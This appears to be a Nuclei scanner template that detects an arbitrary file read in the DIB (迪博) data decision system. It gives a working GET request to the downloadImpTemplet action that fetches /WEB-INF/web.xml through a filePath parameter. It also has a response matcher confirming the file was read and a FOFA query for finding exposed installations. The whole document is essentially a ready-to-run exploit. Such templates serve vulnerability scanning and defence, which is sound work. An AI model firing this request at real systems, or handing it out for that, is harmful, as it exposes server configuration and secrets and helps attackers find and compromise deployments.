id: dib-downloadImpTemplet-fileread
info:
  name: 迪博数据决策系统 downloadImpTemplet 存在任意文件读取
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E8%BF%AA%E5%8D%9A%E6%95%B0%E6%8D%AE%E5%86%B3%E7%AD%96%E7%B3%BB%E7%BB%9F/%E8%BF%AA%E5%8D%9A%E6%95%B0%E6%8D%AE%E5%86%B3%E7%AD%96%E7%B3%BB%E7%BB%9FdownloadImpTemplet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="common/dep/dep/Core.js"
    tips:
    repair:
    version:
  tags: fileread,dib

http:
  - raw:
      - |
        GET /common/dep/common_dep.action.jsp?action=downloadImpTemplet&filePath=/WEB-INF/web.xml&fileName=12 HTTP/1.1
        Host: {{Hostname}}
        Cookie: JSESSIONID=
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Sec-Fetch-User: ?1
        Dnt: 1
        Sec-Gpc: 1
        Priority: u=0, i
        Te: trailers
        Connection: keep-alive
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'xml version=','DIB-DEP')
        condition: and